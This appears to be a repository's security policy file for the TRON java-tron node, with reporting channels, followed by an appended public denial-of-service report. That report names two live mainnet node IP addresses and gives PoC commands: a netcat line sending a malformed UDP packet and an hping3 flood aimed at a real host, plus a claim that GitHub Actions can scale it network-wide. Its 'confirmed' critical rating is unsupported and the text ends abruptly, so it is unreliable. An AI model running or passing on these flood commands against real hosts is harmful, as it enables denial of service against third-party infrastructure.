tronprotocol/java-tron
Please see [Releases](https://github.com/tronprotocol/java-tron/releases). We recommend using the [most recently released version](https://github.com/tronprotocol/java-tron/releases/latest).

## Reporting a Vulnerability
**Please do not file a public ticket** mentioning the vulnerability.
To find out how to report a vulnerability in TRON, visit [https://hackerone.com/tron_dao](https://hackerone.com/tron_dao?type=team) or email [bounty@tron.network](mailto:bounty@tron.network).  
Please read the [disclosure policy](https://www.hackerone.com/disclosure-guidelines) for more information about publicly disclosed security vulnerabilities.
TRON Super Representative (SR) nodes on port 18888 accept malformed UDP packets without validation, triggering BAD_BLOCK/BAD_PROTOCOL handlers in PeerConnection.java and SyncService.java.

**Impact:**
- 24,510 malformed packets → 100% packet loss in 60s
- No rate limiting or connection caps
- Live mainnet SRs: 65.109.115.236:18888, 159.195.146.87:18888
- GitHub Actions automation scales to network-wide DoS

**PoC:**
```bash
# Single malformed packet accepted
printf '\x12\x03BAD\x10\x01' | nc -u 65.109.115.236 18888

# Flood → node consumption
sudo hping3 -2 --flood -p 18888 65.109.115.236
```

**HAI Assessment:** CVSS 9.6 Critical (confirmed) and GitHub
